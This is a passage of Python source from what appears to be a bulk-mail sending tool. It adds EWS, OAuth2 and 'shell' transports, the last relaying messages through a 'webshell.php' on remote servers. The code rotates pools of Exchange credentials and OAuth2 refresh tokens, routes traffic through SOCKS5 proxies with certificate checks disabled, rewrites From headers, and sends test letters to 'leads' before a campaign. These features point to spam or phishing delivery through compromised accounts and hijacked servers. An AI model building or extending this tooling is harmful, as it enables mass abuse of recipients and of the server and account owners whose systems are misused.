        raise Exception('Invalid SMTP envelope sender. Set smtp_config.from_mail to a complete email address.')
    try:
        sender = findString(receivers, sender)
    except Exception:
        pass

    try:
        attempts = 2 if smtp_retry_limit <= 0 else smtp_retry_limit + 1
        for attempt in range(attempts):
            try:
                if port == 465 and usessl:
                    with smtplib.SMTP_SSL(smtpserv, port, context=context, source_address=source_address) as server:
                        server.ehlo()
                        if useauth:
                            server.login(user, password)
                        server.sendmail(sender, receivers, msginfo)
                        return True
                else:
                    with smtplib.SMTP(smtpserv, port, source_address=source_address) as server:
                        server.ehlo()
                        if usessl:
                            server.starttls()
                        if useauth:
                            server.login(user, password)
                            time.sleep(int(secs))
                        server.sendmail(sender, receivers, msginfo)
                        server.quit()
                        return True
            except OSError as error:
                if attempt == 0 and source_address and source_address[1] and is_source_port_in_use(error):
                    source_address = (source_address[0], 0)
                    continue
                if attempt + 1 < attempts and smtp_retry_delay_secs > 0:
                    time.sleep(smtp_retry_delay_secs)
                raise
    except Exception as e:
        raise Exception('Error: {}'.format(e))
        return False

# ============ Additional sending modes: EWS / OAuth2 / Shell (v5) ============
# Implemented natively here so the sender can run smtp / host / ews / oauth2 /
# shell - individually or combined (ordered failover) - from one config.
VALID_SENDING_MODES = ('smtp', 'host', 'ews', 'oauth2', 'shell')
VALUE_MODE_SEPARATORS = re.compile(r'[|,+/&\s]+')
MODE_DISPLAY = {
    'smtp': 'SMTP',
    'host': 'HOST (direct-to-MX)',
    'ews': 'EWS (Exchange Web Services)',
    'oauth2': 'OAUTH2 (Microsoft Graph / Gmail API)',
    'shell': 'SHELL (HTTP relay)',
}
MODE_POOL_KINDS = ('ews', 'oauth2', 'shell')
MODE_SHORT_DISPLAY = {
    'smtp': 'Smtp',
    'host': 'Host',
    'ews': 'Ews',
    'oauth2': 'Oauth2',
    'shell': 'Shell',
}

active_sending_modes = ['smtp']
test_and_send_mode = False  # reserved hook: populated from sending_mode, not yet implemented

ews_config = {
    'host': '', 'username': '', 'password': '', 'from_mail': '',
    'sending_limit': -1, 'enable_multiple': 0,
    'list': 'EWS/exchange.txt', 'selection_system': 1,
}
oauth2_config = {
    'location': 'OAUTH2', 'selection_system': 1,
}
shell_config = {
    'link': '', 'from_mail': '', 'sending_limit': -1,
    'enable_multiple': 0, 'list': 'SHELL/shells.txt', 'selection_system': 1,
    # Optional relay interface tuning (defaults match webshell.php):
    'param_mime': 'mime', 'api_key': '', 'api_key_name': 'Authorization',
    'success_marker': '', 'send_fields': 0,
}

ews_pool = []
oauth2_profiles = []
shell_pool = []
ews_rotation = {'index': 0, 'lock': threading.Lock()}
oauth2_rotation = {'index': 0, 'lock': threading.Lock()}
shell_rotation = {'index': 0, 'lock': threading.Lock()}
_oauth2_token_cache = {}
_oauth2_token_lock = threading.Lock()


def _mode_bool(value, default=False):
    if value is None:
        return default
    if isinstance(value, bool):
        return value
    return str(value).strip().lower() in ('1', 'true', 'yes', 'on')


def _mode_int(value, default=-1):
    try:
        return int(str(value).strip())
    except Exception:
        return default


# v9.3: rotation pools (letters / subjects / from-name / from-mail / links)
# document a selection_system (1 = Cyclic, 2 = Random, 3 = RepeatEach) that was
# previously parsed but never honored, so every pool always rotated cyclically.
def _rotation_selection_mode(value, default=1):
    """Normalize a pool selection_system value (1=Cyclic, 2=Random, 3=RepeatEach)."""
    mode = _mode_int(value, default)
    return mode if mode in (1, 2, 3) else default


def pick_rotation_entry(entries, index, selection_system=1):
    """Return (entry, next_index) from a rotation pool honoring selection_system.

    selection_system 1 (Cyclic / RepeatEach) preserves pool order (round-robin),
    so cyclic rotation is unchanged for the documented default. Values 2-5 pick a
    random entry. Returns (None, index) for an empty pool.
    """
    if not entries:
        return None, index
    if _rotation_selection_mode(selection_system, 1) == 1:
        return entries[index % len(entries)], index + 1
    return random.choice(entries), index + 1


def expand_letter_rotation_entries(lines):
    """Expand ``letterLocation|repeat_count`` rows into repeated letter rows.

    The letter rotation list documents an optional ``|repeat_count`` suffix for
    precise control. Rows without a valid positive count are kept verbatim so
    plain paths (and filenames that legitimately contain a pipe) keep working.
    """
    expanded = []
    for raw in lines or []:
        line = str(raw).strip()
        if not line:
            continue
        location, sep, count_text = line.rpartition('|')
        if sep:
            try:
                count = int(count_text.strip())
            except ValueError:
                count = 0
            if count > 0 and location.strip():
                expanded.extend([location.strip()] * count)
                continue
        expanded.append(line)
    return expanded


def parse_mode_tokens(raw):
    """Split a sending_mode value into an ordered, de-duplicated mode list.

    Accepts the documented single values (smtp / ews / oauth2 / shell / host)
    and combined values separated by | , + / & or whitespace, e.g.
    "smtp | ews". 'test&send' / 'tester' / 'tester&send' are recognised
    modifier tokens (they do not select a transport).
    """
    if isinstance(raw, (list, tuple, set)):
        tokens = []
        for item in raw:
            tokens.extend(parse_mode_tokens(item))
        return tokens
    text = str(raw or '').strip().lower()
    if not text:
        return []
    # 'test&send' / 'tester&send' contain the '&' separator; shield them first.
    # v8.1: shield the long forms ('Tester&Sender' / 'test&sender') BEFORE the
    # short token, otherwise 'tester&sender'.replace('tester&send', ...) leaves
    # a stray 'er' ('testerandsender') that is then silently dropped.
    text = text.replace('tester&sender', 'testerandsend').replace('tester_&_sender', 'testerandsend')
    text = text.replace('test&sender', 'testandsend').replace('test_&_sender', 'testandsend')
    text = text.replace('tester&sending', 'testerandsend').replace('test&sending', 'testandsend')
    text = text.replace('test&send', 'testandsend').replace('test_&_send', 'testandsend')
    text = text.replace('tester&send', 'testerandsend').replace('tester_&_send', 'testerandsend')
    resolved = []
    for token in VALUE_MODE_SEPARATORS.split(text):
        token = token.strip()
        if not token:
            continue
        if token in ('test&send', 'test_&_send', 'testandsend', 'testsend'):
            token = 'test&send'
        if token in ('tester&send', 'tester_&_send', 'testerandsend', 'testersend',
                     'testerandsender', 'testersender'):
            token = 'tester&send'
        if token in VALID_SENDING_MODES or token in ('test&send', 'tester', 'tester&send'):
            if token not in resolved:
                resolved.append(token)
    return resolved


def resolve_sending_modes(raw, host_enabled=True):
    """Return the effective ordered mode list for a sending_mode value."""
    modes = [mode for mode in parse_mode_tokens(raw)
             if mode not in ('test&send', 'tester', 'tester&send')]
    if not host_enabled and 'host' in modes:
        modes = [mode for mode in modes if mode != 'host']
    if not modes:
        modes = ['smtp']
    return modes


def _mode_uses_custom_pool():
    """True when a single non-SMTP/non-host mode owns the send loop."""
    return len(active_sending_modes) == 1 and active_sending_modes[0] in MODE_POOL_KINDS


def tester_mode_label():
    """'Tester Mode' or 'Tester&Sender Mode' depending on tester_send_mode."""
    return 'Tester&Sender Mode' if tester_send_mode else 'Tester Mode'


def transport_tester_label(mode):
    """e.g. 'Smtp Tester Mode', 'Host Tester&Sender Mode'."""
    short = MODE_SHORT_DISPLAY.get(mode, str(mode).capitalize())
    return f'{short} {tester_mode_label()}'


def print_mode_banner(modes=None):
    """Print which sending mode(s) are active, with failover order when combined."""
    modes = list(modes or active_sending_modes or ['smtp'])
    labels = [MODE_DISPLAY.get(mode, mode.upper()) for mode in modes]
    if len(modes) > 1:
        print(f"{Fore.CYAN}[ MODE ] Multiple sending modes enabled: {' + '.join(labels)}{Style.RESET_ALL}", flush=True)
        print(f"{Fore.CYAN}[ MODE ] Failover order: {' -> '.join(labels)}{Style.RESET_ALL}", flush=True)
        print(f"{Fore.YELLOW}[ MODE ] Each message is attempted on the first mode and falls back to the next on failure.{Style.RESET_ALL}", flush=True)
    else:
        print(f"{Fore.CYAN}[ MODE ] Sending mode: {labels[0]}{Style.RESET_ALL}", flush=True)
    if test_and_send_mode and not tester_mode:
        print(f"{Fore.CYAN}[ MODE ] test&send enabled: a dedicated test letter is delivered to the leads before the main campaign.{Style.RESET_ALL}", flush=True)
    if tester_mode:
        for mode in modes:
            print(f"{Fore.GREEN}[ MODE ] {transport_tester_label(mode)}{Style.RESET_ALL}", flush=True)
        if tester_send_mode:
            print(f"{Fore.GREEN}[ MODE ] Tester&Sender Mode: the tester letter is delivered to the leads first, then the main campaign runs with the same transports.{Style.RESET_ALL}", flush=True)
        else:
            print(f"{Fore.GREEN}[ MODE ] Tester Mode: only the tester letter is delivered to the leads; the main campaign will NOT run.{Style.RESET_ALL}", flush=True)


def describe_delivery_target(emails='', smtpserv=''):
    """Human-readable route label used by the sending/status lines."""
    modes = list(active_sending_modes or ['smtp'])
    if len(modes) > 1:
        return ' + '.join(MODE_DISPLAY.get(mode, mode.upper()) for mode in modes)
    mode = modes[0]
    if mode == 'host':
        try:
            return resolve_vdm_host_for_recipient(emails, vdm_force_mx)
        except Exception:
            return 'host-mode'
    if mode == 'smtp':
        return smtpserv or 'smtp'
    if mode == 'ews':
        entry = ews_pool[0] if ews_pool else None
        return (entry.get('ews_url') if entry else (ews_config.get('host') or 'EWS'))
    if mode == 'oauth2':
        profile = oauth2_profiles[0] if oauth2_profiles else None
        return (profile.get('oauth2_login') if profile else 'OAUTH2') or 'OAUTH2'
    if mode == 'shell':
        entry = shell_pool[0] if shell_pool else None
        return (entry.get('shell_link') if entry else (shell_config.get('link') or 'SHELL'))
    return mode.upper()


def _requests_proxy_dict(proxy):
    """Build a requests proxies mapping for an optional SOCKS5 proxy dict."""
    if not proxy:
        return None
    host = str(proxy.get('host') or '').strip()
    if not host:
        return None
    port = str(proxy.get('port') or '').strip() or '1080'
    user = str(proxy.get('user') or '').strip()
    password = str(proxy.get('password') or '').strip()
    auth = ''
    if user:
        auth = '{}:{}@'.format(urllib.parse.quote(user, safe=''), urllib.parse.quote(password, safe=''))
    url = 'socks5h://{}{}:{}'.format(auth, host, port)
    return {'http': url, 'https': url}


def _mode_request_post(url, *, data=None, json_body=None, headers=None, auth=None, proxy=None, timeout=60):
    """POST helper that honors the SOCKS5 proxy with a clear error when unsupported."""
    proxies = _requests_proxy_dict(proxy)
    if proxies:
        try:
            import socks  # noqa: F401  (PySocks, installed by pip.py core)
        except Exception:
            raise Exception('SOCKS5 proxy transport requires PySocks (run: python3 pip.py core)')
    try:
        return requests.post(url, data=data, json=json_body, headers=headers, auth=auth,
                             proxies=proxies, timeout=timeout, verify=False)
    except Exception as exc:
        raise Exception('HTTP delivery error for {}: {}'.format(url, exc))


def _prepare_mime(msginfo, from_addr=''):
    """Return the MIME text with its From header pointed at from_addr when given."""
    text = msginfo if isinstance(msginfo, str) else (msginfo or b'').decode('utf-8', 'replace')
    if not from_addr:
        return text
    try:
        from email import message_from_string
        msg = message_from_string(text)
        if msg.get('From') is not None:
            msg.replace_header('From', from_addr)
        else:
            msg['From'] = from_addr
        return msg.as_string()
    except Exception:
        return text


def _extract_mime_parts(mime_text):
    """Extract (subject, html_body, text_body) from a raw MIME string."""
    subject = ''
    html_body = ''
    text_body = ''
    try:
        from email import message_from_string
        msg = message_from_string(mime_text)
        subject = str(msg.get('Subject', '') or '')
        parts = msg.walk() if msg.is_multipart() else [msg]
        for part in parts:
            if str(part.get('Content-Disposition') or '').lower().startswith('attachment'):
                continue
            ctype = part.get_content_type()
            try:
                payload = part.get_payload(decode=True)
                charset = part.get_content_charset() or 'utf-8'
                decoded = payload.decode(charset, 'replace') if payload else ''
            except Exception:
                decoded = ''
            if ctype == 'text/html' and not html_body:
                html_body = decoded
            elif ctype == 'text/plain' and not text_body:
                text_body = decoded
    except Exception:
        pass
    return subject, html_body, text_body


def _ews_auth(username, password):
    """NTLM auth when requests-ntlm is available, otherwise basic auth."""
    if not username:
        return None
    try:
        from requests_ntlm import HttpNtlmAuth
        return HttpNtlmAuth(username, password)
    except Exception:
        from requests.auth import HTTPBasicAuth
        return HTTPBasicAuth(username, password)


def _split_pool_line(line):
    return [part.strip() for part in str(line or '').split('|')]


def _read_pool_lines(path):
    try:
        with open(path, 'r', encoding='utf-8-sig') as handle:
            return handle.readlines()
    except Exception:
        return []


def _build_ews_entries(lines):
    entries = []
    for raw in lines:
        line = str(raw or '').strip()
        if not line or line.startswith('#') or line.startswith(';'):
            continue
        parts = _split_pool_line(line)
        if len(parts) == 3:
            parts.append(parts[1])
        if len(parts) < 4 or not parts[0]:
            continue
        entries.append({
            'ews_url': parts[0],
            'ews_username': parts[1],
            'ews_password': parts[2],
            'ews_frommail': parts[3] or parts[1],
            'ews_max': _mode_int(parts[4], -1) if len(parts) > 4 else -1,
            'ews_count': 0,
        })
    return entries


def _build_shell_entries(lines):
    entries = []
    for raw in lines:
        line = str(raw or '').strip()
        if not line or line.startswith('#') or line.startswith(';'):
            continue
        parts = _split_pool_line(line)
        if not parts or not parts[0]:
            continue
        entries.append({
            'shell_link': parts[0],
            'shell_frommail': parts[1] if len(parts) > 1 and parts[1] else '',
            'shell_max': _mode_int(parts[2], -1) if len(parts) > 2 else -1,
            'shell_count': 0,
        })
    return entries


def _build_oauth2_profiles(folder):
    profiles = []
    try:
        names = sorted(os.listdir(folder))
    except Exception:
        return profiles
    for name in names:
        if not name.lower().endswith('.json'):
            continue
        path = os.path.join(folder, name)
        try:
            with open(path, 'r', encoding='utf-8-sig') as handle:
                data = json.load(handle)
        except Exception as exc:
            print(f"{Fore.YELLOW}[OAUTH2] Skipping {path}: {exc}{Style.RESET_ALL}", flush=True)
            continue
        if not isinstance(data, dict) or not data:
            continue
        limit = _mode_int(data.get('sending_limit', data.get('sendingLimit', -1)), -1)
        if limit == 0:
            # sending_limit 0 disables this profile entirely.
            continue
        login = str(data.get('login', data.get('email', data.get('from_mail', ''))) or '').strip()
        if not login:
            print(f"{Fore.YELLOW}[OAUTH2] Skipping {path}: no login/email field{Style.RESET_ALL}", flush=True)
            continue
        profiles.append({
            'oauth2_file': path,
            'oauth2_provider': str(data.get('provider', 'microsoft') or 'microsoft').strip().lower(),
            'oauth2_client_id': str(data.get('client_id', data.get('clientId', '')) or '').strip(),
            'oauth2_client_secret': str(data.get('client_secret', data.get('clientSecret', '')) or '').strip(),
            'oauth2_tenant': str(data.get('tenant_id', data.get('tenantId', data.get('tenant', 'common'))) or 'common').strip() or 'common',
            'oauth2_refresh_token': str(data.get('refresh_token', data.get('refreshToken', '')) or '').strip(),
            'oauth2_access_token': str(data.get('access_token', data.get('accessToken', '')) or '').strip(),
            'oauth2_login': login,
            'oauth2_from_name': str(data.get('from_name', data.get('fromName', '')) or '').strip(),
            'oauth2_graph_base': str(data.get('graph_base', data.get('graphBase', 'https://graph.microsoft.com')) or 'https://graph.microsoft.com').strip().rstrip('/'),
            'oauth2_max': limit,
            'oauth2_count': 0,
        })
    return profiles


def _entry_available(entry, count_key, max_key):
    count = _mode_int(entry.get(count_key, 0), 0)
    limit = _mode_int(entry.get(max_key, -1), -1)
    entry[count_key] = count
    entry[max_key] = limit
    return limit < 0 or count < limit


def _select_mode_entry(entries, rotation, selection_system, count_key, max_key, label):
    available = [entry for entry in (entries or []) if _entry_available(entry, count_key, max_key)]
    if not available:
        raise RuntimeError('All {} entries have reached their sending limits.'.format(label))
    if _mode_int(selection_system, 2) == 1:
        with rotation['lock']:
            selected = available[rotation['index'] % len(available)]
            rotation['index'] += 1
    else:
        selected = random.choice(available)
    selected[count_key] = _mode_int(selected.get(count_key, 0), 0) + 1
    return selected


def _single_ews_entry():
    return {
        'ews_url': ews_config.get('host') or '',
        'ews_username': ews_config.get('username') or '',
        'ews_password': ews_config.get('password') or '',
        'ews_frommail': ews_config.get('from_mail') or ews_config.get('username') or '',
    }


def _single_shell_entry():
    return {
        'shell_link': shell_config.get('link') or '',
        'shell_frommail': shell_config.get('from_mail') or '',
    }


def get_next_ews_entry():
    if ews_pool:
        return _select_mode_entry(ews_pool, ews_rotation, ews_config.get('selection_system', 1),
                                  'ews_count', 'ews_max', 'EWS')
    return None


def get_next_oauth2_profile():
    if oauth2_profiles:
        return _select_mode_entry(oauth2_profiles, oauth2_rotation, oauth2_config.get('selection_system', 1),
                                  'oauth2_count', 'oauth2_max', 'OAUTH2')
    return None


def get_next_shell_entry():
    if shell_pool:
        return _select_mode_entry(shell_pool, shell_rotation, shell_config.get('selection_system', 1),
                                  'shell_count', 'shell_max', 'SHELL')
    return None


def load_sending_modes(data):
    """Load ews/oauth2/shell configs, resolve active modes, and build pools.

    Mirrors the SMTP conventions: enable_multiple selects pool mode, the pool
    file is line based, and selection_system 1 is cyclic (other values random).
    """
    global active_sending_modes, test_and_send_mode
    global tester_mode, tester_send_mode, tester_token, _tester_flags_loaded
    global ews_pool, oauth2_profiles, shell_pool
    data = data or {}
    sender_cfg = data.get('sender_config') or {}
    host_cfg = data.get('host_config') or {}
    ews_cfg = data.get('ews_config') or {}
    oauth_cfg = data.get('oauth2_config') or {}
    shell_cfg = data.get('shell_config') or {}

    ews_config['host'] = str(ews_cfg.get('host', ews_config['host']) or '').strip()
    ews_config['username'] = str(ews_cfg.get('username', ews_config['username']) or '').strip()
    ews_config['password'] = str(ews_cfg.get('password', ews_config['password']) or '')
    ews_config['from_mail'] = str(ews_cfg.get('from_mail', ews_config['from_mail']) or '').strip()
    ews_config['sending_limit'] = _mode_int(ews_cfg.get('sending_limit', ews_config['sending_limit']), -1)
    ews_config['enable_multiple'] = 1 if _mode_bool(ews_cfg.get('enable_multiple', ews_config['enable_multiple'])) else 0
    ews_config['list'] = str(ews_cfg.get('list', ews_config['list']) or ews_config['list']).strip()
    ews_config['selection_system'] = _mode_int(ews_cfg.get('selection_system', ews_config['selection_system']), 1)

    oauth2_config['location'] = str(oauth_cfg.get('location', oauth2_config['location']) or oauth2_config['location']).strip()
    oauth2_config['selection_system'] = _mode_int(oauth_cfg.get('selection_system', oauth2_config['selection_system']), 1)

    shell_config['link'] = str(shell_cfg.get('link', shell_config['link']) or '').strip()
    shell_config['from_mail'] = str(shell_cfg.get('from_mail', shell_config['from_mail']) or '').strip()
    shell_config['sending_limit'] = _mode_int(shell_cfg.get('sending_limit', shell_config['sending_limit']), -1)
    shell_config['enable_multiple'] = 1 if _mode_bool(shell_cfg.get('enable_multiple', shell_config['enable_multiple'])) else 0
    shell_config['list'] = str(shell_cfg.get('list', shell_config['list']) or shell_config['list']).strip()
    shell_config['selection_system'] = _mode_int(shell_cfg.get('selection_system', shell_config['selection_system']), 1)
    shell_config['param_mime'] = str(shell_cfg.get('param_mime', shell_config['param_mime']) or 'mime').strip() or 'mime'
    shell_config['api_key'] = str(shell_cfg.get('api_key', shell_config['api_key']) or '').strip()
    shell_config['api_key_name'] = str(shell_cfg.get('api_key_name', shell_config['api_key_name']) or 'Authorization').strip() or 'Authorization'
    shell_config['success_marker'] = str(shell_cfg.get('success_marker', shell_config['success_marker']) or '').strip()
    shell_config['send_fields'] = 1 if _mode_bool(shell_cfg.get('send_fields', shell_config['send_fields'])) else 0

    # Build the optional pools.
    ews_pool = []
    if ews_config['enable_multiple']:
        entries = _build_ews_entries(_read_pool_lines(ews_config['list']))
        if entries:
            if ews_config['sending_limit'] and ews_config['sending_limit'] > 0:
                for entry in entries:
                    if entry['ews_max'] < 0:
                        entry['ews_max'] = ews_config['sending_limit']
            ews_pool = entries
        else:
            print(f"{Fore.YELLOW}[EWS] enable_multiple is on but {ews_config['list']} has no usable entries; using single EWS host.{Style.RESET_ALL}", flush=True)

    shell_pool = []
    if shell_config['enable_multiple']:
        entries = _build_shell_entries(_read_pool_lines(shell_config['list']))
        if entries:
            if shell_config['sending_limit'] and shell_config['sending_limit'] > 0:
                for entry in entries:
                    if entry['shell_max'] < 0:
                        entry['shell_max'] = shell_config['sending_limit']
            shell_pool = entries
        else:
            print(f"{Fore.YELLOW}[SHELL] enable_multiple is on but {shell_config['list']} has no usable entries; using single relay link.{Style.RESET_ALL}", flush=True)

    oauth2_profiles = _build_oauth2_profiles(oauth2_config['location'])

    host_enabled = _mode_bool(host_cfg.get('enable', 'true'), True)
    parsed_modes = parse_mode_tokens(sender_cfg.get('sending_mode', 'smtp'))
    test_and_send_mode = 'test&send' in parsed_modes
    test_cfg = data.get('test_config') or {}
    tester_token = 'tester&send' if 'tester&send' in parsed_modes else ('tester' if 'tester' in parsed_modes else '')
    # v5: test_config.enable is the periodic verification test.
    # v8.2: 'tester' and 'tester&send' are first-class, self-enabling tokens -
    # exactly like smtp / host / ews / oauth2 / shell. The tester mode is ON
    # purely because its token is present in sender_config.sending_mode; to
    # turn it off, remove the token (same as disabling smtp/host/shell). No
    # test_config.tester: true is required any more, and the shipped default
    # 'tester: false' / 'tester&send: false' keys no longer need editing. An
    # optional test_config.tester&send: true upgrades a plain 'tester' token
    # to tester&send (test then campaign). tester_mode always requires a tester
    # token, so a plain v3 'test&send | smtp' config keeps the v3 behaviour
    # (test phase then main campaign, no tester-only stop); the legacy
    # test_config.tester / duplicated 'enable' keys remain accepted for
    # documentation compatibility but no longer gate the tester.
    _periodic_enable_raw, _tester_enable_raw = _resolve_test_enables(test_cfg)
    tester_mode = 1 if tester_token else 0
    _tester_send_raw = test_cfg.get('tester&send', None)
    if tester_token == 'tester&send':
        # The 'tester&send' token runs the tester AND the campaign (v8.2).
        tester_send_mode = 1
    elif tester_mode and not _flag_unset(_tester_send_raw) and _mode_bool(_tester_send_raw, False):
        # A 'tester' token upgraded to tester&send by test_config.tester&send: true.
        tester_send_mode = 1
    else:
        tester_send_mode = 0
    if tester_token and tester_mode:
        test_and_send_mode = True
    _tester_flags_loaded = True
    active_sending_modes = resolve_sending_modes(sender_cfg.get('sending_mode', 'smtp'), host_enabled)
    return active_sending_modes


# --------------------------- EWS transport ---------------------------
def ConnectEWS(receivers, sender, msginfo, bind_ip=None, proxy=None, entry=None):
    """Deliver a message through Exchange Web Services (CreateItem / SendOnly)."""
    recipient_list = [receivers] if isinstance(receivers, str) else list(receivers)
    recipient_list = [r for r in recipient_list if r]
    if not recipient_list:
        raise Exception('EWS: no recipients provided')
    if entry is None:
        entry = get_next_ews_entry() or _single_ews_entry()
    url = str(entry.get('ews_url') or '').strip()
    if url and '://' not in url:
        url = 'https://' + url.strip('/') + '/EWS/Exchange.asmx'
    if not url:
        raise Exception('EWS: missing endpoint (configure ews_config.host, or EWS/exchange.txt as URL|USERNAME|PASSWORD|FROM_MAIL|SENDING_LIMIT)')
    username = entry.get('ews_username') or ews_config.get('username') or ''
    password = entry.get('ews_password') or ews_config.get('password') or ''
    from_mail = entry.get('ews_frommail') or ews_config.get('from_mail') or username
    mime_text = _prepare_mime(msginfo, from_mail)
    mime_b64 = base64.b64encode(mime_text.encode('utf-8', 'replace')).decode('ascii')
    headers = {
        'Content-Type': 'text/xml; charset=utf-8',
        'SOAPAction': 'http://schemas.microsoft.com/exchange/services/2006/messages/CreateItem',
        'Accept': 'text/xml',
    }
    auth = _ews_auth(username, password)

    soap = (
        '<?xml version="1.0" encoding="utf-8"?>'
        '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"'
        ' xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"'
        ' xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">'
        '<soap:Header><t:RequestServerVersion Version="Exchange2013_SP1"/></soap:Header>'
        '<soap:Body><m:CreateItem MessageDisposition="SendOnly"><m:Items>'
        '<t:Message><t:MimeContent CharacterSet="UTF-8">' + mime_b64 + '</t:MimeContent></t:Message>'
        '</m:Items></m:CreateItem></soap:Body></soap:Envelope>'
    )
    response = _mode_request_post(url, data=soap.encode('utf-8'), headers=headers, auth=auth, proxy=proxy)
    body = response.text or ''
    if response.status_code == 200 and 'ResponseClass="Error"' not in body:
        return True

    # Fallback: explicit message fields (some Exchange versions reject MimeContent).
    subject, html_body, text_body = _extract_mime_parts(mime_text)
    to_xml = ''.join(
        '<t:Mailbox><t:EmailAddress>{}</t:EmailAddress></t:Mailbox>'.format(_xml_escape(addr))
        for addr in recipient_list
    )
    body_content = html_body or text_body or ''
    body_type = 'HTML' if html_body else 'Text'
    fields_soap = (
        '<?xml version="1.0" encoding="utf-8"?>'
        '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"'
        ' xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"'
        ' xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">'
        '<soap:Header><t:RequestServerVersion Version="Exchange2013_SP1"/></soap:Header>'
        '<soap:Body><m:CreateItem MessageDisposition="SendOnly"><m:Items><t:Message>'
        '<t:Subject>{subject}</t:Subject>'
        '<t:Body BodyType="{body_type}">{body}</t:Body>'
        '<t:ToRecipients>{to}</t:ToRecipients>'
        '{from_block}'
        '</t:Message></m:Items></m:CreateItem></soap:Body></soap:Envelope>'
    ).format(
        subject=_xml_escape(subject),
        body_type=body_type,
        body=_xml_escape(body_content),
        to=to_xml,
        from_block=('<t:From><t:Mailbox><t:EmailAddress>{}</t:EmailAddress></t:Mailbox></t:From>'.format(_xml_escape(from_mail)) if from_mail else ''),
    )
    response = _mode_request_post(url, data=fields_soap.encode('utf-8'), headers=headers, auth=auth, proxy=proxy)
    body = response.text or ''
    if response.status_code != 200:
        raise Exception('EWS send failed (HTTP {}): {}'.format(response.status_code, body[:300]))
    if 'ResponseClass="Error"' in body:
        raise Exception('EWS rejected message: {}'.format(body[:300]))
    return True


def _xml_escape(value):
    return (str(value or '')
            .replace('&', '&amp;')
            .replace('<', '&lt;')
            .replace('>', '&gt;')
            .replace('"', '&quot;')
            .replace("'", '&apos;'))


# --------------------------- OAuth2 transport ---------------------------
def _oauth2_access_token(profile, proxy=None):
    provider = profile.get('oauth2_provider') or 'microsoft'
    client_id = profile.get('oauth2_client_id') or ''
    refresh_token = profile.get('oauth2_refresh_token') or ''
    cache_key = profile.get('oauth2_file') or (provider + ':' + client_id)
    now = time.time()
    with _oauth2_token_lock:
        cached = _oauth2_token_cache.get(cache_key)
    if cached and cached.get('access_token') and cached.get('expires_at', 0) > now + 30:
        return cached['access_token']

    if client_id and refresh_token:
        client_secret = profile.get('oauth2_client_secret') or ''
        if provider in ('gmail', 'google'):
            token_url = 'https://oauth2.googleapis.com/token'
            data = {'client_id': client_id, 'client_secret': client_secret,
                    'refresh_token': refresh_token, 'grant_type': 'refresh_token'}
        else:
            tenant = profile.get('oauth2_tenant') or 'common'
            token_url = 'https://login.microsoftonline.com/{}/oauth2/v2.0/token'.format(tenant)
            data = {'client_id': client_id, 'client_secret': client_secret,
                    'refresh_token': refresh_token, 'grant_type': 'refresh_token',
                    'scope': 'https://graph.microsoft.com/.default offline_access'}
        response = _mode_request_post(token_url, data=data, proxy=proxy)
        if response.status_code != 200:
            raise Exception('OAUTH2 token request failed (HTTP {}): {}'.format(response.status_code, (response.text or '')[:300]))
        try:
            payload = response.json()
        except Exception:
            raise Exception('OAUTH2 token response was not JSON: {}'.format((response.text or '')[:300]))
        access_token = payload.get('access_token') or ''
        if not access_token:
            raise Exception('OAUTH2 token response missing access_token: {}'.format((response.text or '')[:300]))
        expires_in = _mode_int(payload.get('expires_in', 3600), 3600)
        with _oauth2_token_lock:
            _oauth2_token_cache[cache_key] = {'access_token': access_token, 'expires_at': now + max(60, expires_in)}
        return access_token

    static_token = profile.get('oauth2_access_token') or ''
    if static_token:
        return static_token
    raise Exception('OAUTH2: profile {} needs refresh_token + client_id (or access_token)'.format(profile.get('oauth2_file') or ''))


def _mime_to_graph_payload(mime_text, recipient_list, from_mail):
    subject, html_body, text_body = _extract_mime_parts(mime_text)
    message = {
        'subject': subject,
        'body': {'contentType': 'HTML' if html_body else 'Text', 'content': html_body or text_body},
        'toRecipients': [{'emailAddress': {'address': addr}} for addr in recipient_list],
    }
    if from_mail:
        message['from'] = {'emailAddress': {'address': from_mail}}
    return {'message': message, 'saveToSentItems': True}


def ConnectOAuth2(receivers, sender, msginfo, bind_ip=None, proxy=None, profile=None):
    """Deliver a message through Microsoft Graph or the Gmail API using OAuth2."""
    recipient_list = [receivers] if isinstance(receivers, str) else list(receivers)
    recipient_list = [r for r in recipient_list if r]
    if not recipient_list:
        raise Exception('OAUTH2: no recipients provided')
    if profile is None:
        profile = get_next_oauth2_profile()
    if not profile:
        raise Exception('OAUTH2: no usable profile found in {} (add JSON profiles with sending_limit != 0)'.format(oauth2_config.get('location')))
    provider = profile.get('oauth2_provider') or 'microsoft'
    token = _oauth2_access_token(profile, proxy)
    from_mail = profile.get('oauth2_login') or ''
    mime_text = _prepare_mime(msginfo, from_mail)

    if provider in ('gmail', 'google'):
        url = 'https://gmail.googleapis.com/gmail/v1/users/me/messages/send'
        payload = {'raw': base64.urlsafe_b64encode(mime_text.encode('utf-8', 'replace')).decode('ascii')}
        headers = {'Authorization': 'Bearer ' + token, 'Content-Type': 'application/json'}
        response = _mode_request_post(url, json_body=payload, headers=headers, proxy=proxy)
        if response.status_code not in (200, 202):
            raise Exception('OAUTH2 gmail send failed (HTTP {}): {}'.format(response.status_code, (response.text or '')[:300]))
        return True

    graph_base = profile.get('oauth2_graph_base') or 'https://graph.microsoft.com'
    url = graph_base + '/v1.0/me/sendMail'
    headers = {'Authorization': 'Bearer ' + token, 'Content-Type': 'text/plain'}
    response = _mode_request_post(url, data=mime_text.encode('utf-8', 'replace'), headers=headers, proxy=proxy)
    if response.status_code in (200, 202):
        return True
    if response.status_code == 400:
        # Fall back to the JSON sendMail shape for tenants that reject raw MIME.
        json_headers = {'Authorization': 'Bearer ' + token, 'Content-Type': 'application/json'}
        json_body = _mime_to_graph_payload(mime_text, recipient_list, from_mail)
        response = _mode_request_post(url, json_body=json_body, headers=json_headers, proxy=proxy)
        if response.status_code in (200, 202):
            return True
    raise Exception('OAUTH2 graph send failed (HTTP {}): {}'.format(response.status_code, (response.text or '')[:300]))


# --------------------------- Shell transport ---------------------------
def ConnectShell(receivers, sender, msginfo, bind_ip=None, proxy=None, entry=None):
    """Deliver a message through a remote HTTP relay (webshell.php compatible)."""
    recipient_list = [receivers] if isinstance(receivers, str) else list(receivers)
    recipient_list = [r for r in recipient_list if r]
    if not recipient_list:
        raise Exception('SHELL: no recipients provided')
    if entry is None:
